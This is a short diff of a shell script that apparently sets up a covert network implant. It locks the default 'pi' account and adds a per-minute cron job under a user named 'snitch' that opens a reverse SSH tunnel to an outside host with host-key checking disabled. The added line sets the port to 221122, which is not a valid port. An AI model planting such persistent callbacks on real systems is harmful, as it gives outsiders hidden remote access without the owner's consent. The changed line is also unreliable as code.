@@ -94,7 +94,7 @@ usermod -L pi
 
 # Persistent Callback
 echo "${green} Persisting Callback${reset}"
-line="* * * * * ssh -R $1:21285:127.0.0.1:22 dummy@$1 -p 22 -N -o \"StrictHostKeyChecking no\" "
+line="* * * * * ssh -R $1:221122:127.0.0.1:22 dummy@$1 -p 22 -N -o \"StrictHostKeyChecking no\" "
 (crontab -u snitch -l; echo "$line") | crontab -u snitch -
 
 echo "${green} ..............${reset}"
